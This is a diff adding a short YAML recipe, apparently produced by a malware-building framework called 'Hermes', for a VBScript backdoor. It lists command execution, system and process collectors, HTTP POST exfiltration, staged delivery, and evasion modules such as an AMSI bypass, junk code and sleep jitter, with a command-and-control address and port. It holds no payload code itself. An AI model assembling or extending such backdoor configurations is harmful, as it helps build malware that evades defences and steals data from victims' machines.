@@ -1,0 +1,20 @@
+name: vbs_backdoor_cs_v1
+description: Auto-generated recipe by Hermes (vbscript)
+format: vbscript
+core:
+- core/emit_buffer
+- core/run_cmd
+- core/file_ops
+collectors:
+- collectors/sysinfo
+- collectors/processes
+exfil: exfil/http_post
+arch: arch/staged
+evasion:
+- evasion/amsi_bypass
+- evasion/junk_code
+- evasion/sleep_jitter
+- evasion/user_agent_rotate
+vars:
+  C2_IP: 10.0.2.2
+  C2_PORT: '9001'
